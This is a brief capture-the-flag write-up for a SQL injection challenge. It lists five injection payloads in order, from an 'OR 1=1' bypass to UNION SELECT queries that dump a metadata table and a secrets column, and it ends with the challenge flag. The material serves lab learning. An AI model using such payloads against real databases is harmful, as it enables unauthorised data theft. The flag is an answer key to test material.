# Database Incursion
basic sqli challenge that i thought was too overcomplicated for a while but later figured it out
```
' OR 1=1 --
```
<img width="1789" height="688" alt="image" src="https://github.com/user-attachments/assets/5f6ffb06-7bb1-485d-bb56-b0cf75fc7d71" />

```
%' OR department='Management' OR '%'='
```
<img width="1284" height="580" alt="image" src="https://github.com/user-attachments/assets/77238f90-cd6f-469a-b864-74743780807f" />
```
%' OR (name='Kiwi' AND department='Management') OR '%'='
```
<img width="1284" height="580" alt="image" src="https://github.com/user-attachments/assets/a21e160e-e710-47f4-a554-fff56ff5dcfe" />
```
' UNION SELECT * FROM metadata --
```
<img width="1789" height="986" alt="image" src="https://github.com/user-attachments/assets/78a6eac3-bb9a-4013-9f47-abd3da461a5f" />
```
' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 --
```
<img width="1789" height="882" alt="image" src="https://github.com/user-attachments/assets/f9bed3a3-9afc-4d87-a196-5b4a0603af0a" />

## flag
`` CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?} ``
